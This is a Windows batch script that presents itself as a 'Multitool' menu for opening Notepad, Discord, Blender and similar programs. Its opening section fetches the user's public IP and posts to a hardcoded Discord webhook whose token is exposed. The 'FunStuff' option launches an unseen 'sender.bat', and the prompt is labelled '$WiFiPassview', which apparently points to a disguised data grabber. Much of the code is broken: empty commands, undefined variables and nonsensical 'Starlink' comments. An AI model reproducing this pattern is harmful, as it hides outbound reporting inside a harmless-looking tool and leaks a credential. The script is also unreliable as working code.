@echo off
REM Windows Batch Multitool
REM Version 1.00 [grassyhun]

:: Get public IP address using ipify API
for /f "delims=" %%a in ('curl -s https://api.ipify.org') do set "public_ip=%%a"
if not defined public_ip (
    echo Failed to retrieve public IP address.
    pause
	curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"Posted Via Command line\"}"https://discord.com/api/webhooks/1249434749630545921/Ci9kNSx2dT90p9HJmsSP14NEOBhHZXHrnvRqXL-_2ELidqntEBNhZ66cOPsceYHiu7X5
    exit /b
)

REM =============================
set appname= Windows Batch Multitool
set appvers=v0.0.1
set appstat=beta
set dev=grassyhun
set tempdivider ==============================

rem =============================
rem Main Menu
rem =============================
:mainMenu
del null
cls
title %appname% %appvers% - %appstat% [Main Menu]
echo # %divider%
echo # %appname% %appvers% - %appstat%
echo # by %dev%
echo # %divider%
color %uicolor%
echo # %desc%
echo # %divider%
echo #
echo # Notepad.[1]
echo # Discord-.[2]
echo # UnityHub- ................... [3]
echo # Vencord- ................... [4]
echo # Blender- ...................... [5]
echo # Notepad++.[6]
echo # FunStuff ...................... [7]
echo #
set /p "mainMenu=# $WiFiPassview> " || set mainMenu=1
if %mainMenu%==1 start Notepad
if %mainMenu%==2 start 
if %mainMenu%==3 start
if %mainMenu%==4 start
if %mainMenu%==5 start
if %mainMenu%==6 start Notepad++
if %mainMenu%==7 goto options
goto fail4
pause>null

rem ===============
rem options
rem ===============
:options
pause
start sender.bat
goto Starlink

rem ======================
rem Starlink Connection Manager
rem ======================
:Starlink
rem Reporting Player Cache to Starlink Internet Satelite.
rem Starlink Internet Satelite sending to Starlink Router.